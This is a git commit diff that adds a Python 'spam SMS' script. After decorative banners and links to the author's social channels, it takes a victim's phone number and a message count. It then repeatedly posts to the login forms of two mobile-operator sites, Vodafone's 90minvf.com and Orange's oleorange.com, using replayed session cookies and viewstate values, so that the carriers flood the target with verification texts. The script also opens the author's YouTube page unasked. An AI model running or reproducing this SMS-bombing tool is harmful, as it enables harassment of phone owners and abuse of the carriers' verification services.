f6eab8b035d381d6dd9d9a17d8c19fbd0c515491
Abdullah Salah <95449686+AbdullahSalaah0099@users.noreply.github.com>
2022-05-21 10:09:28 +0200

    Update Spam Orange,vodafone By Abdullah (1) (2).py

--- Spam Orange,vodafone By Abdullah (1) (2).py
+++ Spam Orange,vodafone By Abdullah (1) (2).py
@@ -25,3 +25,307 @@ else:
     print ()
     print ('\033[1;91mError Password')
     exit()
+
+import os, sys, os, sys, time, os, sys, time
+import requests,bs4
+import os, time
+#os.system('pip install requests && pip install bs4')
+os.system('clear')
+import requests
+from bs4 import BeautifulSoup
+import requests, os, sys, time 
+
+g='''\033[1;92m ######### welcom in abdullah script ######## .'''*1
+for e in g+ '\n':
+	sys.stdout.write(e)
+	sys.stdout.flush()
+	time.sleep(0.020)
+print ()
+
+
+#r='''\033[1;92m@@@@@@@script spam sms by abdullah @@@@@@'''
+
+#for e in r+ '\n':
+#	sys.stdout.write(e)
+#	sys.stdout.flush()
+#	time.sleep(0.040)
+#	print ()
+#	print ()
+
+
+#t='''\033[1;91m##########always desire to learn #something useful########'''
+#for e in t+ '\n':
+#	sys.stdout.write(e)
+#	sys.stdout.flush()
+#	time.sleep(0.040)
+
+
+f=  '''\033[1;92m                        A
+                        B D
+                      U L L A
+                     A.......H
+                    MMMMMMMMMMM
+                  MMMMMMMMMMMMMMM
+                 MMMMMmMMMMMmMMMMM
+                MMMMMMMMMMMMMMMMMMM
+               MMMMMMMMMMMMMmMMmMMMM
+              MMMMMMMMMMMMMMMMMMMMMMM
+            MMMMMMMMMMMMMMMMMMMMMMMMMMM
+          MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+        MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM '''
+
+print ()
+
+
+for e in f + '\n':
+	sys.stdout.write(e)
+	sys.stdout.flush()
+	time.sleep(0.0010)
+	
+print ()
+print ()
+import pyfiglet ,sys,time
+import termcolor
+o= ("Hello Friend 👋👋👋👋👋👋")
+
+for e in o+ '\n':
+	sys.stdout.write(e)
+	sys.stdout.flush()
+	
+	time.sleep(.040)
+
+
+print()
+i=("\033[1;92m#"*60)
+
+for e in i + '\n':
+	sys.stdout.write(e)
+	sys.stdout.flush()
+	time.sleep(.0010)
+
+
+print ()
+print ('\033[1;92m')
+#w=pyfiglet.figlet_format ("ABDULLAH")
+#print (termcolor.colored (w,color ='green'))
+print ('\033[1;91m$$$$$$$$$$Projected by Abdullah Salah$$$$$$$$$$$$')
+
+
+i='''\033[;095m\033[;092m Telegram channel : 
+
+  ◇ http://t.me/Techno0099
+          
+Youttube channel  : 
+
+ ◇ https://youtube.com/channel/UCAbtkFAe9yyX0HJNFXyKJUg
+ 
+Facebook  :
+    
+    ◇https://www.facebook.com/AbdullahSalah0099/'''
+for I in i +'\n':
+	sys.stdout.write (I)
+	sys.stdout.flush ()
+	time.sleep (00.020)
+print ()
+
+import requests, json, random, string, time
+from bs4 import BeautifulSoup
+import sys, os, time, datetime
+import requests,json,random,string,termcolor,time,pyfiglet
+from bs4 import BeautifulSoup
+import requests, os, time, sys
+import webbrowser
+#ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+def jalan(z):
+ for e in z +   '\n'  :
+  sys.stdout.write(e)
+  sys.stdout.flush()
+  time.sleep(00000.05)
+
+print("\x1b[1;92m## "*30)
+print ()
+jalan(' \033[1;33m Welcome to script spam sms by α в ɒ υ ℓ ℓ α н ')
+
+print("\x1b[1;31m="*50)
+
+logo = pyfiglet.figlet_format("By Abdullah")
+
+
+print ("■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■")
+
+print("\033[0;92m     ___   _____   _____   _   _   _       _           ___   _   _  ")
+print("\033[0;34m    /   | |  _  \ |  _  \ | | | | | |     | |         /   | | | | | ")
+print("\033[0;34m   / /| | | |_| | | | | | | | | | | |     | |        / /| | | |_| | ")
+print("\033[0;34m  / / | | |  _  { | | | | | | | | | |     | |       / / | | |  _  | ")
+print("\033[0;34m / /  | | | |_| | | |_| | | |_| | | |___  | |___   / /  | | | | | | ")
+print("\033[0;34m/_/   |_| |_____/ |_____/ \_____/ |_____| |_____| /_/   |_| |_| |_| ")
+
+print("\x1b[1;31m@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
+
+
+
+mb = pyfiglet.figlet_format("Spam sms")
+print ("*************************************************************")
+descr = """
+ \033[0;92mBy: Abdullah Salah
+ 
+ https://youtube.com/channel/UCAbtkFAe9yyX0HJNFXyKJUg
+ """
+print(termcolor.colored(logo, color="green"), termcolor.colored(mb, color="yellow"),termcolor.colored(descr, color="red"))
+
+webbrowser.open('https://youtube.com/channel/UCAbtkFAe9yyX0HJNFXyKJUg')
+
+print("\x1b[1;34m="*50)
+ 
+
+ 
+x = input("""\033[1;39m[\033[1;34m1\033[1;39m]\033[0;37mOrange
+\033[1;39m[\033[1;34m2\033[1;39m] \033[0;31mVodafone
+
+\033[1;39m[\033[1;34m*\033[1;39m] \033[0;31mEnter the selection number\033[1;39m : """)
+print()
+print('\033[1;34mـ'*50)
+print()
+if x == '2' :
+	import requests
+	try:
+		num = int(input('\033[1;34mEnter Phone Number \033[1;34m:\033[1;39m '))
+		count = int(input('\033[1;32mEnter Number Of Messages \033[1;34m: \033[1;39m'))
+	except:
+		print()
+		print('\033[1;31merror')
+		exit('\033[1;39m')
+		print()
+	op = 0
+	while op<count:
+	   hd ={
+    'Host': '90minvf.com',
+
+'Connection': 'keep-alive',
+
+'Content-Length': '1295',
+
+'Cache-Control': 'no-cache',
+
+'DNT': '1',
+
+'X-Requested-With': 'XMLHttpRequest',
+
+'X-MicrosoftAjax': 'Delta=true',
+
+'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
+
+'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+
+'Accept': '*/*',
+
+'Origin': 'http://90minvf.com',
+
+'Referer': 'http://90minvf.com/login',
+
+'Accept-Encoding': 'gzip, deflate',
+
+'Accept-Language': 'ar-EG,ar-AE;q=0.9,ar;q=0.8,en-GB;q=0.7,en;q=0.6,en-US;q=0.5',
+
+'Cookie': 'ASP.NET_SessionId=emsjzmhorowsq5y4bbfa214z; _fbp=fb.1.1648389299840.1434596381; _ga=GA1.2.73257886.1648389321; _gid=GA1.2.1531723474.1648389321'}
+
+	   url = 'http://90minvf.com/login'
+	   
+	   data ={
+'ctl31':'uplauth|btnSubmit',
+
+'__LASTFOCUS':'',
+
+'__EVENTTARGET':'',
+
+'__EVENTARGUMENT':'',
+
+'__VIEWSTATE':'frk8gFZmGD+U+QKnZ765QELcbVHIQKUoKxFHYxFiVCtlZ8L4sh8d7LPXsIaGWqgbuPMvv/dmI+OD2xBK1cPhas4VClyda7v/TLQSuO+bYMK42ZUA9XFLG1MxLVPa1DajIxRPBp4lj+j408FsE9d/wITMee3ElGZ/G+P/YXKgZzJiF5tqvyAkBltAdjh8++iIA9j4fDfC7r0yGkaAQxHfjPVEUvD1XIFoHHWtjwgUbJRX464GNqhcBQ6HQ83xYUL7NnVQQE9pPR6PDcnVOkmkF/9JTLSPmoJI4viziCSnitoLeztT9AqeHhcI6WDcc54eN4fEKkQF7gsUMJmrY1ftc5ulDbZiISmveUlHeuJiJO8ezeZ/fxm59LYXwfICo8AEyn0C6o93UvI/Ptg6pSejCBTn+raovNSj4pw3uOxj5H7uW7YWe0U4UUIDtLQ0bjPd9mGIj7eadkSqyrIJA5m8VxrY+8KNWm2sCbW6J+1J8HJL+pWRybIfgfFWKcY2f2JAtdh8XtRFyBnPcECvGFe5IQqNNFYNLmPxghodNHCl9FzRO6SivjszW6q151jCFk47lnqOFcvVzByOiD+g6lZ5LiNjlPPFUau+afd+SfMxiLM2cJM01tI1fUumlX+cpj+WH3KRvmNPsGsk2BSYOcNMGlTOXkNR3/l0RWoYsC5p/zBVi1u97ASazqxrTG+zoMh8QNVu/FANRwwbgXDmg7Nch+5A5WrAC6v0YXHCBHCI8T15DttzPhBBkeFxhGDXs5qtQTPedu05GANFklF4xhiSm2lAlPafhypoA4kISwvRTnSpQpK6kNeCI/zieB/mUJMEszvy7nmMxAXMecz8lbcZcg==',
+
+'__VIEWSTATEGENERATOR':'C2EE9ABB',
+
+'__EVENTVALIDATION':'6CZsoZRy+gMNHPWYLyJWFoYwkTrcPOk28inhROMO4i1D4FBHYPyaxTzxEfnEkplVUayRmZeY/fqbMjn9a3HQi8ByQFXDVBA504J9IQ9ROSdq4xXeC8uF3yWPGicOvM7QNwHW1fSCwqlyIUwOuInYGA==',
+
+'txtPhone':num,
+
+'__ASYNCPOST':'true',
+
+'btnSubmit':'إرسال'
+
+}
+	   r = requests.post(url, headers=hd, data=data).text
+	   op = op + 1
+	   
+	   if True :
+	   	print(f'\x1b[1;99m• \x1b[1;93mDone Send Sms {op}')
+	   else:
+	   	print("\x1b[1;99m• \x1b[1;91mThere's a mistake")
+	   	print('\033[1;39m')
+	   	exit()
+	   	print('\033[1;39m')
+	
+if x == '1' :
+	import requests
+	a = 0
+	try:
+		num = input('\033[1;32mEnter Phone Number \033[1;34m:\033[1;39m ')
+		count = int(input('\033[1;32mEnter Number Of Messages \033[1;34m: \033[1;39m'))
+	except:
+		print()
+		print('\033[1;31merror')
+		exit('\033[1;39m')
+		print()
+	op = 0
+	while op<count:
+	   hd = {
+    "Host": "oleorange.com",
+    "Connection": "keep-alive",
+    "Content-Length": "427",
+    "Cache-Control": "max-age\u003d0",
+    "Upgrade-Insecure-Requests": "1",
+    "Origin": "http://oleorange.com",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
+    "Referer": "http://oleorange.com/login",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept-Language": "en-US,en;q\u003d0.9,ar-EG;q\u003d0.8,ar;q\u003d0.7",
+    "Cookie": "_ga\u003dGA1.2.2019747161.1622654085; _gid\u003dGA1.2.875712095.1622808599; _gat_gtag_UA_143099725_1\u003d1"
+  }
+  
+	   url = 'http://oleorange.com/login'
+	   
+	   data = {
+'__LASTFOCUS':'',
+'__EVENTTARGET':'',
+'__EVENTARGUMENT':'',
+'__VIEWSTATE':'FiJazqnh5l2e4/1lyIWN3lakRXyZNjFJthGqPukpX2TtR1N+VIb02ifPnQ+/3O+M5h9MHeGWFvrSoUsKrrmNkED0KOXFvBM1oINY/Kqqst0=',
+'__VIEWSTATEGENERATOR':'C2EE9ABB',
+'__EVENTVALIDATION':'hEOV7KjACybySncpY5zItuxpqfj6QvyvZw4yW32GCm+dQkoEIFYMEeY8OR3c9NrKpqmVoCuE6MzVi6UnGIGNxafDx/4ZiQ79/yyfimp4fKUAIcifYGHFPlni6d9VqkGknol5SuJh2chhtGflg1pTAQ==',
+'txtPhone':num,
+'btnLogin':'Access'
+}
+
+	   r = requests.post(url, headers=hd, data=data).text
+	   op = op + 1
+	   
+	   if 'rfvtxtVerificationCode' in r:
+	   	print(f'\x1b[1;32m• \x1b[1;34mDone Send Sms {op}')
+	   else:
+	   		print("\x1b[1;99m• \x1b[1;91mThere's a mistake")
+	   		print('\033[1;39m')
+	   		exit()
+	print("قناة اليوتيوب   https://youtube.com/channel/UCAbtkFAe9yyX0HJNFXyKJUg")
+
+
+
+
+
+
+
+
+
+
